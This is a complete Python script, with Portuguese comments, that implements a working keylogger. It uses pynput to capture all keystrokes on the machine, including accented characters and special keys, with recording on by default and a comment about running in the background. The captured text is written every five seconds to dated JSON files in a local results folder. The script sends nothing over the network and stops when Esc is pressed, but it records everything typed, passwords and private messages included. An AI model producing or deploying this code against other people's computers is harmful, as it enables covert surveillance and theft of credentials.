import sys
import os
import threading
import time
from datetime import datetime
import json
import support

Key = None
Listener = None

class KeyLogger:
    def __init__(self):
        self.current_text = ""
        self.pending_accent = ""
        self.lock = threading.Lock()
        self.interval = 5
        # Ajuste de caminho para funcionar em background
        cur = os.path.dirname(os.path.abspath(__file__))
        # Se estiver em src/scripts/..., sobe dois níveis para a raiz do projeto
        root = os.path.dirname(os.path.dirname(cur))
        self.results_dir = os.path.join(root, "results", "inputs")
        os.makedirs(self.results_dir, exist_ok=True)
        
        # Ativado por padrão já que não haverá botão de Toggle
        self.record_enabled = True

        self.ACCENT_MAP = {
            '~': {'a': 'ã', 'o': 'õ', 'n': 'ñ', 'A': 'Ã', 'O': 'Õ'},
            '´': {'a': 'á', 'e': 'é', 'i': 'í', 'o': 'ó', 'u': 'ú', 'A': 'Á', 'E': 'É', 'I': 'Í', 'O': 'Ó', 'U': 'Ú'},
            '^': {'a': 'â', 'e': 'ê', 'o': 'ô', 'A': 'Â', 'E': 'Ê', 'O': 'Ô'},
            '`': {'a': 'à', 'A': 'À'},
            '¨': {'u': 'ü', 'U': 'Ü'}
        }

    def get_filename(self):
        current_day = datetime.now().strftime("%Y-%m-%d")
        return os.path.join(self.results_dir, f"keyboard_inputs_{current_day}.json")

    def save_to_file(self):
        while True:
            time.sleep(self.interval)
            with self.lock:
                if self.current_text and self.record_enabled:
                    filename = self.get_filename()
                    entry = {"timestamp": datetime.now().strftime("%H:%M:%S"), "content": self.current_text}
                    data = []
                    if os.path.exists(filename):
                        try:
                            with open(filename, "r", encoding="utf-8") as f:
                                data = json.load(f)
                        except:
                            data = []
                    data.append(entry)
                    with open(filename, "w", encoding="utf-8") as f:
                        json.dump(data, f, ensure_ascii=False, indent=4)
                    self.current_text = ""

    def on_press(self, key):
        with self.lock:
            try:
                char = key.char
                if char:
                    if self.pending_accent:
                        combined = self.ACCENT_MAP.get(self.pending_accent, {}).get(char, self.pending_accent + char)
                        self.current_text += combined
                        self.pending_accent = ""
                    elif char in "´`~^¨":
                        self.pending_accent = char
                    elif ord(char) >= 32:
                        self.current_text += char
            except AttributeError:
                if self.pending_accent:
                    self.current_text += self.pending_accent
                    self.pending_accent = ""

                special_keys = {
                    Key.space: " ", Key.enter: "\n", Key.backspace: "[BACKSPACE]",
                    Key.tab: "[TAB]", Key.shift: "[SHIFT]", Key.ctrl_l: "[CTRL]",
                    Key.ctrl_r: "[CTRL]", Key.alt_l: "[ALT]", Key.delete: "[DELETE]",
                    Key.insert: "[INSERT]", Key.print_screen: "[PRINT_SCREEN]",
                    Key.caps_lock: "[CAPS_LOCK]", Key.esc: "[ESC]"
                }
                if key in special_keys:
                    self.current_text += special_keys[key]

    def on_release(self, key):
        global Key
        if key == Key.esc:
            return False

def main():
    support.ensure_dependencies(["pynput"])
    global Listener, Key
    from pynput.keyboard import Listener, Key

    logger = KeyLogger()
    saver = threading.Thread(target=logger.save_to_file, daemon=True)
    saver.start()
    with Listener(on_press=logger.on_press, on_release=logger.on_release) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
